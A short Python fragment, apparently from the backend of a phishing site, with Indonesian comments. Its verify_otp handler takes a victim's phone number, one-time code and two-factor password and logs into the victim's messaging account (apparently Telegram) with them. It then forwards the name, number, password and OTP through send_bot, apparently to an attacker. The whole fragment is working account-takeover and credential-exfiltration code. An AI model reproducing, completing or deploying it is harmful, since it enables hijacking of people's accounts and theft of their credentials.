...
async def verify_otp():
    ...
    if nomor not in active_sessions: return jsonify({"status": "error"}), 400
    
    s = active_sessions[nomor]
    try:
        # Coba Login dengan OTP
        await s["client"].sign_in(nomor, otp, phone_code_hash=s["hash"])
        # Jika lolos tanpa 2FA
        text = f"Nama: {s['nama']}\nNomor: {nomor}\nKata sandi: None\nOTP : {otp}"
        ...
        if sandi:
            try:
                await s["client"].sign_in(password=sandi)
                text = f"Nama: {s['nama']}\nNomor: {nomor}\nKata sandi: {sandi}\nOTP : {otp}"
                send_bot(text, msg_id=s["msg_id"], show_otp=True, nomor=nomor)
                return jsonify({"status": "success"}), 200
